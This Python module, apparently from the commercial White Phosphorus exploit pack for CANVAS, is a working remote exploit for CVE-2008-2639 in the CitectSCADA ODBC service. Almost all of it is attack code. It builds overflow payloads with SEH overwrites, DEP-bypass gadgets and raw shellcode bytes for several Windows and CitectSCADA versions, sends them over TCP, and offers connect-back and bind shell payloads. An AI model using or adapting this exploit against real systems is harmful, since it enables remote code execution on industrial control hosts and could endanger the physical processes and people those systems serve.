
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
import canvasengine
from MOSDEF import mosdef 
from MOSDEF.mosdefutils import *
from MOSDEFShellServer import MosdefShellServer


######################################################################################
NAME="CitectSCADA Remote Exploit"
DESCRIPTION="Exploits a vulnerability in the CitectSCADA control application"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION["Date public"] = "11th June 2008"
DOCUMENTATION["Repeatability"]="N/A"
DOCUMENTATION['CVE Name']='CVE-2008-2639'
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2639'
DOCUMENTATION['CVSS'] = '7.6'
DOCUMENTATION["References"] = "http://www.coresecurity.com/content/citect-scada-odbc-service-vulnerability"
DOCUMENTATION['Notes']="""
This software does not install on Windows 2003 SP1. The exploit will work against ClientScadaV7.0r1, ClientFacilitiesV7.0 and ClientScadaV6.10
"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000","2003", "XP" ]

PORT = 20222
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Autoversioning", (0x00000000, 0x00000000, 0x0000), []],
    1 : ["Windows 2003 SP1-SP2 DEP", (0x00000000, 0x00000000, 0x0000), [WIN2K3SP1, WIN2K3SP2]],
    2 : ["Windows XP SP1-SP2 DEP", (0x00000000, 0x00000000, 0x0000), [WINXPSP2, WINXPSP3]],
    3 : ["Windows Other", (0x00000000, 0x00000000, 0x0000), [WINALL]]
}

class theexploit(wp_exploit):
    ######################################################################################
    ## WP> Dialog Information
    ##########################s############################################################
    PAYLOADS=["TCP Connect Back",
            "IE Inject Connect Back",
            "HTTPMOSDEF SSL",
            "HTTPMOSDEF PLAIN",            
            "Bind MOSDEF Shell",
            "Execute Command"]

    DEFAULT_PAYLOAD = 0

    def __init__(self):
        tcpexploit.__init__(self)
        self.host = "127.0.0.1"
        self.port = PORT
        self.targets = targets
        self.version = 0
        self.badstring= "\x00\x09\x0a\x0d\x20\x25\x26\x2b"
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.autoVersioned = False        
        return

    def usage(self):
        self.wp_usage(targets,"-O appversion:<1 or 2>\t1=Version 7.0r1\t2=Version 6.10")
        return        
        
    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return      
        
    def test(self):
        # Simple test
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        return wp_isPortOpen(self,self.host,self.port)

    def neededListenerTypes(self):
    		# We use this function to grab different shellcode type and os types
        self.getArgs()

        return self.wp_createWin32Listener()

    def createShellcode(self):
    		# We use this function to grab different shellcode type and os types
        self.getArgs()

        if self.version == 0:
            return 0  

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    

    def getArgs(self):
        
        # Selected shell options
        self.wp_getShellcodeType()

        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))



        if self.argsDict.get("AppVersion_value",'Version 7.0r1') == 'Version 7.0r1':
            self.AppVersion =1
        else:
            self.AppVersion = 2
        
        # cmd line option
        if self.argsDict.get("appversion",'') == '1':
            self.AppVersion =1
        elif self.argsDict.get("appversion",'') == '2':
            self.AppVersion =2
        
        # Autoversioning OS/target detection
        if self.version == 0 and not self.autoVersioned:
            self.version = self.wp_autoVersionTarget(targets)
                    
        return
        
    def makesploitV7(self):
        payload =""
        if self.version == 1: #Windows 2003
            payload += "\x90" * 8		 # Used as a spacer
            payload += pack('L', 0x10003B9B) # Pop ESP - pop edi, pop esi, pop ebx ret [client.dll]
            payload += "\x40" * 12		 # Used as a spacer
        
            # This code will run from the stack
            findselfCode = "\x8B\xB4\x24\xE8\xFC\xFF\xFF\x81\xC6\x90\x01\x00\x00\x68\x02\x02\x02\x00\x6A\x40\x68\x00\x10\x00\x00\x56\xFF\x15\x14\x11\xBA\x77\xFF\xE6" 
        
            payload += self.wp_UniversalDEPBypassWin2k3_VP(len(findselfCode)) 
        
            # Add findself shellcode
            payload += findselfCode
                           
            payload += wp_randomstring(339-len(payload))
            payload += pack('<L', 0x00000640)   	 # Stack Adjustment, Causes ESP to point to beginning of payload
            payload += wp_randomstring(33)
            payload += pack('L', 0x6013263E)      # Fix ESP - ADC ESP,DWORD PTR DS:[EAX-25] [ctutil32.dll]
            payload += pack('L', 0x10042616)      # SE Handler: MOV EAX, [EBP+C] / CALL [EAX] - Client.dll
            payload += "\x90" * 20
            payload += self.shellcode
            payload += wp_randomstring(1000)
        
        elif self.version == 2: #Windows XP SP2/SP3
            payload += "\x90" * 8		 # Used as a spacer
            payload += pack('L', 0x10003B9B) # Pop ESP - pop edi, pop esi, pop ebx ret [client.dll]
            payload += "\x40" * 12		 # Used as a spacer
            
        
            # This code will run from the stack
            findselfCode = "\x8B\xB4\x24\x28\xFD\xFF\xFF\x81\xC6\x90\x01\x00\x00\x68\x02\x02\x02\x00\x6A\x40\x68\x00\x10\x00\x00\x56\xFF\x15\x20\x11\xC1\x77\xFF\xE6" 
        
            payload += self.wp_UniversalDEPBypassWinXP_VP(len(findselfCode))
        
            # Add findself shellcode
            payload += findselfCode
                           
            payload += wp_randomstring(343-len(payload))
            payload += pack('<L', 0x00000648)   	 # Stack Adjustment, Causes ESP to point to beginning of payload
            payload += wp_randomstring(33)
            payload += pack('L', 0x6013263E)      # Fix ESP - ADC ESP,DWORD PTR DS:[EAX-25] [ctutil32.dll]
            payload += pack('L', 0x10042616)      # SE Handler: MOV EAX, [EBP+C] / CALL [EAX] - Client.dll
            payload += "\x90" * 20
            payload += self.shellcode
            payload += wp_randomstring(1000)
   
        elif self.version == 3: # Windows XP SP0/SP1, Windows 2000 and 'other' NON DEP systems
            payload += wp_randomstring(380-len(payload))
            payload += "\xeb\x06\x90\x90"
            payload += pack('<L', 0x10001863)   	# Pop, Pop, Ret in client.dll
            # Add findself shellcode
            payload += "\x8B\x74\x24\x5C\x90\x90\x90\x90\xff\xe6" 
            payload += "\x90" * 20
            payload += self.shellcode
            payload += wp_randomstring(1000)
        
        # Magic Tag
        payload = "\x02\x00\x00\x00\x00" + big_order(len(payload)) + payload          
        
        return payload
                
    def makesploitV6(self):
        payload =""
        if self.version == 1: #Windows 2003
            payload += "\x90" * 8		 # Used as a spacer
            payload += wp_randomstring(124)		 # Used as a spacer
        
            # This code will run from the stack
            findshellCode = "\x8B\xB4\x24\xF4\xFC\xFF\xFF\x81\xC6\xb8\x01\x00\x00\x68\x02\x02\x02\x00\x6A\x40\x68\x00\x10\x00\x00\x56\xFF\x15\x14\x11\xBA\x77\xFF\xE6" 
            payload += self.wp_UniversalDEPBypassWin2k3_VP(len(findshellCode))
        
            # Add findself shellcode
            payload += findshellCode
                           
            payload += wp_randomstring(339-len(payload))
            payload += pack('<L', 0x00000640)   	 # Stack Adjustment, Causes ESP to point to beginning of payload
            payload += wp_randomstring(33)
            payload += pack('L', 0x1000E3C7)      # MOV ESP,EAX [client.dll]
            payload += pack('L', 0x100EB670)      # SE Handler: MOV EAX,[EBP + C], CALL [EAX] [client.dll]
            payload += pack('L', 0x1010A480)      # Sub ESP, [ESP+10] [client.dll]
            payload += wp_randomstring(8)
            payload += pack('L', 0x10007849) # pop , pop, pop, pop , ret [client.dll]
            payload += wp_randomstring(4)
            payload += "\x00\x01\x00\x00"       # adjust stack amount
            payload += "\x90" * 20
            payload += self.shellcode
            payload += wp_randomstring(1000)
        
        elif self.version == 2: #Windows XP SP2/SP3
            payload += "\x90" * 8		 # Used as a spacer
            payload += wp_randomstring(124)		 # Used as a spacer
        
            findshellCode = "\x8B\xB4\x24\x28\xFD\xFF\xFF\x81\xC6\xb8\x01\x00\x00\x68\x02\x02\x02\x00\x6A\x40\x68\x00\x10\x00\x00\x56\xFF\x15\x20\x11\xC1\x77\xFF\xE6" 
            
            payload += self.wp_UniversalDEPBypassWinXP_VP(len(findshellCode))
        
            # Add findself shellcode
            payload += findshellCode
                           
            payload += wp_randomstring(343-len(payload))
            payload += pack('<L', 0x00000640)   	 # Stack Adjustment, Causes ESP to point to beginning of payload
            payload += wp_randomstring(33)
            payload += pack('L', 0x1000E3C7)      # MOV ESP,EAX [client.dll]
            payload += pack('L', 0x100EB670)      # SE Handler: MOV EAX,[EBP + C], CALL [EAX] [client.dll]
            payload += pack('L', 0x1010A480)      # Sub ESP, [ESP+10] [client.dll]
            payload += wp_randomstring(8)
            payload += pack('L', 0x10007849) # pop , pop, pop, pop , ret [client.dll]
            payload += wp_randomstring(4)
            payload += "\x00\x01\x00\x00"       # adjust stack amount
            payload += "\x90" * 20
            payload += self.shellcode
            payload += wp_randomstring(1000)
   
        elif self.version == 3: # Windows XP SP0/SP1, Windows 2000 and 'other' NON DEP systems
            payload += wp_randomstring(380-len(payload))
            payload += "\xeb\x06\x90\x90"
            payload += pack('<L', 0x10001827)   	# Pop, Pop, Ret in client.dll
            # Add findself shellcode
            payload += "\x8B\x74\x24\x5C\x90\x90\x90\x90\xff\xe6" 
            payload += "\x90" * 20
            payload += self.shellcode
            payload += wp_randomstring(1000)
        
        # Magic Tag
        payload = "\x02\x00\x00\x00\x00" + big_order(len(payload)) + payload          
        
        return payload                

    def makesploit(self):
        if self.AppVersion == 1: #Version 7
            self.log("WP> Building exploit packet for version 7.0r1")
            payload = self.makesploitV7()
        else: # Version 6
            self.log("WP> Building exploit packet for version 6.10")
            payload = self.makesploitV6()
        
        return payload


    def run(self):

        if self.version == 0:
            self.log("WP> Autoversioning failed.")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0

        try:
            payload = self.makesploit()
            length_packet = big_order(len(payload))

            self.log("WP> Connecting to target: %s:%d"%(self.host,self.port))
            s = self.gettcpsock()
            s.connect((self.host, self.port))
                        
            self.log("WP> Sending Size: %d Bytes" % (len(payload)))
            s.sendall(length_packet)
            time.sleep(0.1)
            
            self.log("WP> Sending Exploit")
            s.sendall(payload)

            if getattr(self, 'shell_REUSESOCKET',False) == False:
                s.close()

        except:
            self.log("WP> Attack reported no open socket - service died?")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0        

        # Check if follow up is required for some shellcodes

        time.sleep(10)
        
        ret = self.wp_postExploitShellcode(s)
        if ret:
           return ret

        ret=self.ISucceeded()
        
        self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
        return ret


if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
